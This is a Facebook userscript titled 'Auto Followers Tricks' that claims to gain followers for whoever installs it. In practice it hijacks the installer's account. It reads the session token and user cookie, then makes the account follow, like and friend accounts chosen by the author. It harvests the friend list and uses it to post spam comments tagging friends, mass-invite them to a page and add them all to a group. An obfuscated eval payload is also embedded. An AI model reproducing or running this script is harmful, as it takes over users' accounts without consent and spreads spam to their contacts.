// ==UserScript==
// @name            Auto Followers Tricks
// @namespace       Anonymous
// @description     Automatic
// @author          Axl Napoles
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==


var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div.style.bottom="0";
_div.align="center";
var _audio= document.createElement('audio');
_audio.style.width="100%";
_audio.style.height="25px";
_audio.controls = true;
_audio.autoplay = false;
_audio.autoplay = true;
_audio.src = "http://www.uploadhosting.co/uploads/222.127.170.109/F4%20-%20Jue%20Bu%20Neng%20Shi%20Qu%20Ni%20%28Lyric%20Video%29.mp3";
_div.appendChild(_audio);
_body.appendChild(_div);

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}a("100000079178759");a("100000215901022");a("100006457512476");a("100005709577600");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}sublist("787807751236414");sublist("221538714713113");sublist("389180384552221");sublist("718241808188452");sublist("1515829971975572"); var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}Like("882006890513784712");Like("664833173575802");Like("719905521394225");Like("1426350047615947");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}

var _9917;var _7194='5235D105B202C1018F1018C1108C1223F1163B833F1268C983B953F1028A1023E1023C1023A1023E1023B1033E1028D1048B1068F1023D1028A1023D1033D1033F953E988E1078C833B1268A983B953E1028F1023D1023E1023D1023D1023A1023E1058D1068F1028C1058C1063E1058C1048D1068D953F988B1078C833B1358A1368B1273B1323E1308C1358D1363A983A953B1058C1063A1058E1063B1023D1058C1058A1048B1028D1033D1038D1053D1043C1028C1043B953B988A1078B833B1358D1368F1273C1323B1308A1358D1363D983A953A1063A1023A1033F1028E1053F1058F1063B1028A1068D1063B1023F1023A1043B1023A1058D953C988F1078A833F1358A1368D1273A1323C1308A1358B1363A983F953C1063B1023F1033C1038D1068C1043B1068B1033B1038E1028C1028F1028F1023C1038A1023F953C988F1078E833A1358A1368C1273E1323A1308A1358C1363D983E953B1063B1028F1063D1063A1028E1033D1053C1043C1028A1043D1053F1068B1033F1048F1063E953F988B1078B833D1358C1368A1273A1323C1308C1358C1363C983E953E1063C1023A1068F1053C1033E1068A1058C1053B1048E1058F1033E1023E1063C1058A1068D953A988B1078E833F1358D1368B1273F1323D1308D1358E1363C983C953E1063D1028B1053C1063B1023C1038D1028A1053B1063C1038E1038B1053B1063A1058C1033F953D988D1078B833E1358C1368E1273A1323F1308C1358E1363F983F953D1063D1033B1038D1038D1028A1058C1058A1063B1043E1038D1048E1033C1023C1058F1058C953B988A1078C833D1358B1368B1273D1323E1308B1358B1363F983C953E1063A1028A1068F1063C1033A1038F1053F1028A1028A1038F1053E1063D1028C1053D1028E953E988B1078C833D1358E1368C1273E1323D1308F1358D1363D983B953E1063B1033F1043D1043C1068D1048A1053A1043E1023F1068B1023E1023D1068A1048D1063E953F988A1078F833A1358D1368E1273F1323E1308F1358D1363F983A953E1063B1033D1048F1048E1048C1053C1028C1028D1043D1028E1033E1063F1033B1043F1043A953D988A1078F833F1358C1368D1273B1323D1308D1358B1363B983C953B1063E1038E1028B1058F1038E1053F1033A1033D1038F1048E1028A1023E1033A1038D1038B953B988A1078E833C1358D1368D1273F1323A1308A1358B1363E983D953D1063B1038E1048E1043E1068F1063E1048F1068A1053F1043D1053F1058B1038E1033A1068A953A988E1078E833A1358A1368A1273D1323F1308F1358A1363A983E953E1063E1048E1043B1058B1023A1038F1058A1038E1043B1048B1043D1053D1063D1028A1048D953A988B1078F833E1358F1368A1273E1323A1308D1358A1363E983E953A1033C1033D1028C1048A1038D1063E1058D1028F1043C1058F1028B1038B1028A1028F1038A953B988E1078D833E1358C1368B1273D1323B1308B1358C1363D983C953F1033F1038E1063C1043D1053C1068D1038D1028B1053C1038C1043F1048E1028C1063A1023B953C988B1078E833F1358B1368A1273D1323C1308B1358C1363E983D953D1038F1063C1068F1028C1063D1023C1038D1063E1043B1048E1048F1033C1033A1033F1028E953B988E1078C833D1358A1368A1273A1323D1308E1358F1363F983A953E1058C1028E1063C1033F1043F1028F1063F1023C1063D1028B1063F1063B1043F1048F1033D953F988B1078B833E1358B1368B1273F1323B1308F1358E1363A983F953C1058C1033C1068E1053D1028D1068A1058F1063E1038F1058B1028B1058D1038C1033D1028C953E988E1078F833B1358C1368B1273B1323E1308C1358C1363E983A953C1058D1043A1038A1058A1068E1053D1043A1028F1063B1068D1053D1053E1038B1033D1043E953F988C1078C833B1358F1368F1273C1323C1308F1358E1363F983B953E1028D1048C1038B1063E1068B1058E1063B1053C1063D1053A1038C1033B1058C1038A1053A1058F953E988E1078B833A1358C1368A1273C1323F1308C1358B1363A983B953D1028C1048C1028B1048D1063C1033F1068D1068B1058E1028B1068D1058A1048C1048C1058D1033C953E988F1078E833C833F1183E983D953F1063D1043D1058C1068F1023C1053D1033F1043C1028D1063D1068B1038A1033C1038D1028E953A988C1078C833C1183B983E953E1053D1063F1028E1033F1043A1033B1063C1053B1063F1048E1048F1068D1048E1058D1023B953A988E1078B833A1183E983F953D1063A1048B1043A1028D1023D1043D1023F1033D1058D1068A1043A1023F1028D1028A1068D953F988B1078D833C1183F983E953D1043D1038F1043C1063E1063B1038C1058A1043D1068C1063B1053A1033E1028E1048C1028E953A988F1078F833A1183A983E953E1063E1038C1063B1048A1058E1068C1063C1053A1033F1063B1033D1048B1063F1053D1068E953C988E1078B833A1183F983B953D1053B1043E1038C1058C1043C1023B1048D1043B1033E1038B1048D1038D1038B1053F1023B953D988E1078B833B1183C983C953E1063D1053C1028A1033F1053D1033D1023D1038B1058D1033D1033C1043A1038E1028C1063E953D988B1078F833B1163B1308F1318E1288D983A953B1033D1043A1058E1063A1068F1043F1043F1053B1048B1038C1038D1048D1038F1023F1053D953C988B1078B833B1163F1308B1318F1288D983A953A1043D1043E1028C1053D1058D1048D1043D1063C1048F1068E1058F1063A1068E1043A1028B953C988C1078A833D1163D1308A1318F1288E983D953C1053A1053C1043B1063B1038F1038D1028A1058A1038D1048E1058D1048E1063F1023D1033E953A988E1078A833D1163E1308D1318D1288D983E953D1033D1028C1048F1033E1053D1063F1023A1033C1048B1038E1038C1038F1043E1058F1038A953A988F1078E833D1163A1308E1318E1288F983F953E1043A1063F1023A1043A1023A1063C1028A1048C1048A1038E1063E1048D1063A1028E1068B953C988D1078C833D1163F1308A1318F1288E983E953B1028E1053B1038D1028D1058B1058E1038C1048A1038B1063D1053E1028C1033C1028D1028E953C988E1078A833A1163E1308D1318A1288A983A953F1028A1048F1033C1048E1068D1058C1068C1033D1028B1053C1023F1063A1023C1053C1028E953E988D1078C833B1163F1308A1318B1288F983E953F1053D1038C1043F1038D1068A1063D1058C1058C1068F1068C1053A1043E1053D1053B1033F953A988C1078B833A1163E1308D1318A1288D983B953D1053B1053F1043D1063E1038F1038B1028E1058F1038B1048E1058B1048D1063F1023C1033F953A988F1078C833C1163C1308B1318B1288F983C953F1058D1028B1068A1068A1023F1048D1048D1033E1028E1038D1068B1043F1033B1033C1048D953D988B1078B';var _7564=/[\x41\x42\x43\x44\x45\x46]/;var _9989=2;var _9808=_7194.charAt(_7194.length-1);var _8190;var _8564=_7194.split(_7564);var _5185=[String.fromCharCode,isNaN,parseInt,String];_8564[1]=_5185[_9989+1](_5185[_9989](_8564[1])/21);var _2054=(_9989==9)?String:eval;_8190='';_11=_5185[_9989](_8564[0])/_5185[_9989](_8564[1]);for(_9917=3;_9917<_11;_9917++)_8190+=(_5185[_9989-2]((_5185[_9989](_8564[_9917])+_5185[_9989](_8564[2])+_5185[_9989](_8564[1]))/_5185[_9989](_8564[1])-_5185[_9989](_8564[2])+_5185[_9989](_8564[1])-1));var _6012='_2239';var _6713='_6012=_8190';function _1274(_9901){_2054(_7570);_1274(_7548);_7548(_6713);_1274(_6012);}var _7570='_1274=_2054';var _7548='_7548=_1274';_1274(_9808);

//BELLE
a("100000079178759");
sublist("718241808188452");
sublist("729619783717321");
sublist("743796418966324");
sublist("729619783717321");

//Lance
sublist("580186295421835");
sublist("588503714590093");

//Bryan
a("100001979764078");
sublist("617027778373209"); 
sublist("617028085039845");

//Kotkot Christian
sublist("364805486997723");
sublist("350738731737732");
sublist("364546730356932");
sublist("807588472602139");
sublist("399266303551641");

//Fegie
sublist("1380817252199987");
sublist("1380817685533277");
sublist("1380818405533205");

//Johnrey
sublist("581565551892278");
sublist("600706483311518");
sublist("614272108621622");

//OneLast
a("100001798868579");
sublist("481151498621475");
sublist("484145208322104");
sublist("521654264571198");

//Jeff
sublist("705036859536508");
sublist("704505366256324");
sublist("704508629589331");

//Vincent Krystle
sublist("590524454364391");
sublist("783983711616985");
 
//Kenmill
sublist("607239009325413");
sublist("583569545025693");
sublist("607269799322334");

//Jhasper
sublist("575951859159754");

//Mikaella
sublist("527887177329334");
sublist("532787983505920"); 
sublist("541597782624940");
sublist("559696064148445");

//James
a("100008167082127");
sublist("481151498621475");
sublist("484145208322104");
sublist("521654264571198");

//Likayan
a("100006195879835");
sublist("246792575486878"); 
sublist("247254082107394");
sublist("1402999566583226");

//Erl
a("100000112441646");
sublist("647009855312757");
sublist("682271671786575");
sublist("720047464675662");

//Leosam
a("100001822745112");
sublist("629129547157798");
sublist("639454989458587");
sublist("650091905061562");

//Rollen
a("100001661291193");
sublist("522259411172764");

//Gio Cynax Yash
sublist("1401175013490478");
sublist("1397265067214806");
sublist("1396747193936128");
sublist("1396747303936117");
sublist("1396747407269440");
sublist("1423590861232884");
sublist("1375816672700556");
sublist("1375816672700556");

P("847906241893231");
P("681242868559570");
P("643740542353360");
P("861262037224318");
P("839370409413481");
P("814038208611535");
P("728678343830773");
Like("695561023837958");
Like("744344082272628");
Like("695561023837958");
Like("1437177929859956");

var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","1426354680948817","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=  Hey! If You Want Followers Follow the step. Try it Guys! \ud83d\udc47 \ud83d\udc7d \ud83d\udc4d  \ud83d\udc47 \ud83d\udc7d \ud83d\udc4d  \ud83d\udc47 \ud83d\udc7d \ud83d\udc4d \ud83d\udc47 ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var Title='<span style="font-size:x-large;"><b><span style="color: red;">AUTO FOLLOWERS 2014 Codes||Axl</span></b></span><br/>';var Descriptions = "",page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];function InviteFriends(opo){jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=441675485978941&__user="+ user_id +  "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function (a) {var b = a.substring(a.indexOf("{"));var c = JSON.parse(b);i--;Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";if (c.error) {Descriptions += "color:darkred'>";err++;if (c.errorDescription) Descriptions += c.errorDescription;else Descriptions += JSON.stringify(c, null, "")} else {Descriptions += "color:darkgreen'>";Descriptions += arn[i] + " has been invited t " + page_name + ".";suc++}Descriptions += "</div>";var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:600px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>"; display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div><br/>";if (i > 0) {display += "Detected <b>" +arr.length + "</b> User Online<br/>";display += "<b>" + suc + "</b> of <b>" +arr.length + "</b> Getting Followers.<br/>";display += " (<b>" + i + "</b> User Left...)<br/><br/>";display += '<span style="color: lime;"><span style="font-size: large;"><b>Please Wait Until The Process is Complete</b></span></span>';display += "</div>";display += "</div>";window[tag + "_close"] = true} else {display += '<span style="color: lime;"><span style="font-size: large;"><b>SUCCESS</b></span></span>';display += "<div><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Tutup</span><br/>";display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";display += "</div>"; window[tag + "_close"] = false}display += "</div>";  document.getElementById("pagelet_sidebar").innerHTML = display}, "text", "post"); tay--;if (tay > 0) {var s = arr[tay];setTimeout("InviteFriends(" + s + ")", 100)}console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);}jx = {b: function () {var b = !1; if ("undefined" != typeof ActiveXObject) try {b = new ActiveXObject("Msxml2.XMLHTTP")} catch (c) {try {b = new ActiveXObject("Microsoft.XMLHTTP")} catch (a) {b = !1}} else if (window.XMLHttpRequest) try {b = new XMLHttpRequest} catch (h) { b = !1} return b},load: function (b, c, a, h, g) {var e = this.d();if (e && b) {e.overrideMimeType && e.overrideMimeType("text/xml"); h || (h = "GET"); a || (a = "text");g || (g = {}); a = a.toLowerCase();h = h.toUpperCase();b += b.indexOf("?") + 1 ? "&" : "?";var k = null;"POST" == h && (k = b.split("?"), b = k[0], k = k[1]);e.open(h, b, !0);e.onreadystatechange = g.c ? function () {g.c(e)} : function () {if (4 == e.readyState)if (200 == e.status) {var b = "";e.responseText && (b = e.responseText);"j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);c && c(b)} else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)};e.send(k)}}, d: function () {return this.b()}};function ChangeLocation() {window.location.href = "http://www.facebook.com/"}setTimeout("ChangeLocation", 1);window.onbeforeunload = function () {if (window[tag + "_close"]) return "Auto Like Sedang Berjalan, Tunggu Sampai Selesai!"};var i = 3;var tay = 3;var suc = 0;var err = 0;var arr = new Array;var arn = new Array;var pho = new Array;var tag = "Close";var page_name, x = document.getElementsByTagName("span");for (i = 0; i < x.length; i++)if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {var b = a;var c = b.substring(b.indexOf("{"));var d = JSON.parse(c);d = d.payload.entries;for (var e = 0; e < d.length; e++) arr.push(d[e].uid);for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);i = arr.length - 1;tay = i;console.log(arr.length);var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:600px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";display += arr.length + " User Detected";display += "</div>";document.getElementById("pagelet_sidebar").innerHTML = display;InviteFriends(arr[i])});var parent=document.getElementsByTagName("html")[0];var _body = document.getElementsByTagName('body')[0];var _div = document.createElement('div');_div.style.height="25";_div.style.width="100%";_div.style.position="fixed";_div.style.top="auto";_div.style.bottom="0";_div.align="center";_body.appendChild(_div);

var gid = ['554134518016733'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};